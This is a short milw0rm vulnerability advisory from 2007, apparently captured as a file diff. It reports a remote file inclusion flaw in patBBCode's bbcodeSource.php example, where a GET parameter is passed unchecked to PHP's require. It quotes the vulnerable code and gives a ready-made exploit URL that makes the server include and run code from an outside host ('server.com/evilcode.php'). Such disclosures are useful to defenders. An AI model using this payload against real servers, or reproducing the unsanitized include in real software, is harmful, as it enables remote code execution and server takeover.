@@ -1,0 +1,26 @@
+Link to download:
+http://www.php-tools.net/site.php?file=patBBCode/overview.xml
+
+Vuln file:
+examples\patExampleGen\bbcodeSource.php
+
+Vuln code:
+    if( !isset( $_GET['example'] ) )
+        die( 'No example selected.' );
+   
+    $exampleId = $_GET['example'];
+
+    ob_start();
+
+    // make the example think it's still in the right place
+    chdir( '../' );
+   
+    // include the example
+    require $exampleId.'.php';
+   
+    ob_end_clean();
+
+Exploit:
+examples\patExampleGen\bbcodeSource.php?example= http://server.com/evilcode.php
+
+# milw0rm.com [2007-11-12]
